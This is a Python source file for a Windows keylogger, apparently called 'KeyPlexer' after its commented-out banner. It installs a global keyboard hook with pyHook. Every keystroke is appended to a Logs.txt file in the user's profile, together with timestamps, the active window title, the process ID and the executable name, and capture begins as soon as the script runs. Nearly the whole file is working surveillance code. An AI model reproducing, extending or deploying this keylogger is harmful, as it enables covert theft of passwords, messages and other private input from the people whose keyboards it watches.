#!/usr/bin/env python
from ctypes import *
from threading import Thread
import pythoncom
import pyHook
import win32clipboard
import os
import time
import datetime
import win32gui
import win32api



##def intro():
##
##   key_ascii=
##    	"""
##	 _  __             ____   _                        
##        | |/ / ___  _   _ |  _ \ | |  ___ __  __ ___  _ __ 
##        | ' / / _ \| | | || |_) || | / _ \\ \/ // _ \| '__|
##        | . \|  __/| |_| ||  __/ | ||  __/ >  <|  __/| |   
##        |_|\_\\___| \__, ||_|    |_| \___|/_/\_\\___||_|   
##             		|___/                                  
##
##
##		 ooo,    .---.
##		 o`  o   /    |\________________
##		o`   'oooo()  | ________   _   _)
##		`oo   o` \    |/        | | | |
##		  `ooo'   `---'         "-" |_|
##		"""
##    print key_ascii
##    
#intro()



user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = ""
logging_output = ""
logging_date = datetime.datetime.now()
logging_status = False
logging_key_thread = 0
timer = 0 

file_name = os.path.join(os.path.expandvars("%userprofile%"),"Logs.txt")

def save_to_file(logs):
    
    output_file = open(file_name,"a+")
    output_file.write(logs)
    output_file.close()


def get_current_process():

    # get the active window handle
    window_handle = user32.GetForegroundWindow()
    
    # get the acitve program process ID
    program_pid = c_ulong(0) 
    user32.GetWindowThreadProcessId(window_handle, byref(program_pid))

    # store the current program process ID
    process_id = "%d" % program_pid.value

    # using the process id , grab the program (exe) path
    program_path = create_string_buffer("\0x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, program_pid)

    psapi.GetModuleBaseNameA(h_process,None, byref(program_path), 512)

    # read the active window title

    window_title = create_string_buffer("\0x00" * 512)
    length = user32.GetWindowTextA(window_handle, byref(window_title),512)

    # save the window name in a file
    save_to_file("[*] [PID: %s %s %s]" % (process_id, program_path.value, window_title.value))
    
    # close the hanldes
    kernel32.CloseHandle(window_handle)
    kernel32.CloseHandle(h_process)
    


def key_logging(key_thread, timer, file_name):
    
            global logging_output, logging_status,logging_date

            logging_output += "\n"
            logging_status = True
            main_thread_id = win32api.GetCurrentThreadId()
    
            w = win32gui
            current_window = w.GetWindowText (w.GetForegroundWindow())
            
            # open file to write
            # TO-DO save_to_file function
            output_file = open(file_name, 'w')
            output_file.write(logging_output)
            output_file.close()
            
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = capture_key_strokes # captures keydown stores
            hooks_manager.HookKeyboard()
            pythoncom.PumpMessages()
            
            logging_status = False
            
            return True

def capture_key_strokes(event):

    global current_window, logging_output, logging_status

    if logging_status == False:
        return True

    logging_output = ""
    output_file = open(file_name,"a")
    wg = win32gui
    active_window = wg.GetWindowText (wg.GetForegroundWindow())

    if active_window != current_window:
        
        # Display the logs is a formatted way
        get_current_process()
        logging_date = str(datetime.datetime.now())
        
        logging_output += "\n" + "[*] " + " Date & Time: " + " [ " + logging_date +  " ]" + "\n"
        logging_output += "--" * len(logging_date) + "--\n"
        current_window = active_window
        output_file.write(logging_output)
    
    logging_output = ""

    # TO-DO : Back Space, Enter  
    if event.Ascii == 8:
        logging_output += "\b"
        
    elif event.Ascii == 13 or event.Ascii == 9:
        logging_output += "\n"
        
    else:
        # add 
        logging_output += str(chr(event.Ascii))
        
    # add logs to the file
    output_file.write(logging_output)
    output_file.close()
    
    return True 


# begin keylogging
kl = Thread(target=key_logging, args=(logging_key_thread,timer,file_name))
kl.start()
